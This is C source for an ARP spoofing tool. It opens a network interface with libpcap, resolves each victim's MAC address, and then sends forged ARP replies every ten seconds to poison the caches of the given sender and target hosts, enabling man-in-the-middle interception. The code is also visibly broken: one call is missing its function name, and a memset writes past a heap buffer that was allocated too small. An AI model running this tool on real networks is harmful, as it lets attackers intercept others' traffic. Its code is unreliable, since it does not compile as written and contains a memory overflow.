#include "arp_spoofing.h"

void usage() {
    printf("syntax: arp_spoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: arp_spoofing ens33 192.168.0.15 192.168.0.1\n");
}

int main (int argc, char *argv[], char *envp[]) {
    pcap_t *pcap;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *iface = argv[1];
    uint32_t *sender_ip = NULL;
    uint32_t *target_ip = NULL;
    uint8_t my_mac[6];
    uint32_t my_ip;
    uint8_t is_target;
    int i, j;
    struct pcap_pkthdr* header;
    const uint8_t *data;
    arp *packet;
    arp *send;
    arp **infecting;

    if(argc < 4 || argc % 2) {
        usage();
        return -1;
    }
    sender_ip = (uint32_t*)malloc(sizeof(uint32_t) * (argc - 2) / 2);
    target_ip = (uint32_t*)malloc(sizeof(uint32_t) * (argc - 2) / 2);
    infecting = (arp**)malloc(sizeof(arp*) * (argc - 2) / 2);
    if(!sender_ip || !target_ip || !infecting) {
        fprintf(stderr, "Malloc error.\n");
        return -1;
    }
    for (i = 0; i < (argc - 2) / 2; ++i) {
        infecting[i] = (arp*)malloc(sizeof(arp) + 1);
        if(!infecting[i]) {
            fprintf(stderr, "Malloc error.\n");
            return -1;
        }
        memset(infecting[i], '\0', sizeof(arp) + 0x10);
        sender_ip[i] = inet_addr(argv[i * 2 + 2]);
        target_ip[i] = inet_addr(argv[i * 2 + 3]);
    }

    pcap = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", iface, errbuf);
        return -1;
    }

    send = (arp*)malloc(sizeof(arp) + 0x10);
    if(!get_my_mac(my_mac)) {
        fprintf(stderr, "Can't get my mac address :(\n");
        return -1;
    }
    if(!get_my_ip(iface, &my_ip)) {
        fprintf(stderr, "Can't get my ip address :(\n");
        return -1;
    }
    
    for(i = 0; i < (argc - 2) / 2; ++i) {
        set_arp(send, my_mac, (uint8_t*)"\xff\xff\xff\xff\xff\xff", REQUEST, (uint8_t*)"\0\0\0\0\0\0", 
                    my_ip, my_mac, sender_ip[i]);
        packet =    (pcap, &header, &data, send);
        if(!packet) {
            fprintf(stderr, "Can't resolve target arp packet :(\n");
            return -1;
        }
        set_arp(infecting[i], my_mac, packet->sender_mac, REPLY, my_mac, 
                    target_ip[i], packet->sender_mac, sender_ip[i]);
    }
    setvbuf(stdout, 0LL, 1, 0LL);
    setvbuf(stderr, 0LL, 1, 0LL);
    while(true) {
        for(i = 0; i < (argc - 2) / 2; ++i) 
            pcap_sendpacket(pcap, (u_char*)infecting[i], sizeof(arp));
        sleep(10);
        puts("ARP INFECTING....");
    }
}

